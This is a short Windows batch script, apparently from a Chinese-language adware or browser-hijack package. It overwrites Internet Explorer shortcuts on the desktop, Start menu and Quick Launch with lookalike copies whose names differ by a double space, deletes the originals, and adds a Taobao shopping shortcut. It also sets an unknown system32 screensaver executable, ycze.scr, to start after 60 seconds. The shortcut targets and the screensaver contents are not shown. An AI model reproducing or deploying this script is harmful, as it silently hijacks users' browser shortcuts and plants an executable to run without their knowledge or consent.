@echo off
copy "Internet Explorer.lnk" "%userprofile%\桌面\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\程序\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet  Explorer 浏览器.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet  Explorer.lnk" /y
copy "baobao.lnk" "%userprofile%\桌面\淘宝购物.lnk" /y
del "%userprofile%\桌面\IEXPLORE.lnk"
del "%userprofile%\桌面\IEXPLOREr.lnk"
del "%userprofile%\桌面\Internet Explorer.lnk"
del "%userprofile%\桌面\Internet.lnk"
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk"
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk"
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "SCRNSAVE.EXE" /t reg_sz /d C:\WINDOWS\system32\ycze.scr /f
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "ScreenSaveActive" /t reg_sz /d 1 /f
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "ScreenSaveTimeOut" /t reg_sz /d 60 /f